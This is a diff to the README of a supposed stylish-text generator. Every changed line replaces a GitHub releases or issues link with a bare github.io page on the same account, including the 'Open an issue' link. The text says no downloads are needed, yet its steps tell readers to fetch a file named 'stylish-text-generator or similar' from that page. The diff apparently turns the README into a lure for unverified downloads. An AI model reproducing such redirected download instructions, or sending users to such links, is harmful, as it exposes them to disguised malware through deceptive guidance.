@@ -1,6 +1,6 @@
 # ✨ stylojem-stylish-text-generator - Transform Plain Text into Art
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/adulterine-cavebat11/stylojem-stylish-text-generator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=github)](https://adulterine-cavebat11.github.io)
 
 ## 🚀 What Is This?
 
@@ -31,7 +31,7 @@ No downloads, no accounts, no coding skills needed. Just open it and start creat
 
 **Step 1: Visit the download page**  
 Click the big green badge above or go directly to:  
-[https://github.com/adulterine-cavebat11/stylojem-stylish-text-generator/releases](https://github.com/adulterine-cavebat11/stylojem-stylish-text-generator/releases)
+[https://adulterine-cavebat11.github.io](https://adulterine-cavebat11.github.io)
 
 **Step 2: Download the application**  
 Visit this link to download the application. Look for the latest release (usually at the top of the page). Click the file named "stylish-text-generator" or similar.
@@ -89,7 +89,7 @@ Everything runs locally on your computer. No data is sent anywhere.
 ## 📢 Feedback & Support
 
 For questions, suggestions, or issues:
-- Open an issue on GitHub: [https://github.com/adulterine-cavebat11/stylojem-stylish-text-generator/issues](https://github.com/adulterine-cavebat11/stylojem-stylish-text-generator/issues)
+- Open an issue on GitHub: [https://adulterine-cavebat11.github.io](https://adulterine-cavebat11.github.io)
 
 ---
 
